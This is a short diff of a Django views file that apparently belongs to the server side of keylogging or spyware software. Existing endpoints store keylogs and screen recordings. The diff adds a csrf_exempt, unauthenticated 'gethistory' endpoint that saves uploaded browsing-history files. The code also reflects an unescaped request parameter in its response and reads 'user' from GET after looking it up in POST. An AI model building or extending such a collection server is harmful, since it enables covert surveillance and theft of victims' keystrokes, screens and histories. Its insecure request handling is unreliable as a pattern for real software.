@@ -1,6 +1,6 @@
 from django.shortcuts import render
 from django.http import HttpResponse
-from .models import KeyLog, ScreenRecord
+from .models import KeyLog, ScreenRecord, HistoryFile
 from django.contrib.auth.models import User
 from django.views.decorators.csrf import csrf_exempt
 
@@ -21,5 +21,16 @@ def getscreenrecords(request):
         k = ScreenRecord(record=request.FILES.get('record'))
     else:
         k = ScreenRecord(record=request.FILES.get('record'), user=user)
+    k.save()
+    return HttpResponse('success ' + request.GET.__getitem__('user'))
+
+
+@csrf_exempt
+def gethistory(request):
+    user = User.objects.filter(username=request.POST.get('user')).first()
+    if user is None:
+        k = HistoryFile(history=request.FILES.get('history'))
+    else:
+        k = HistoryFile(history=request.FILES.get('history'), user=user)
     k.save()
     return HttpResponse('success ' + request.GET.__getitem__('user'))
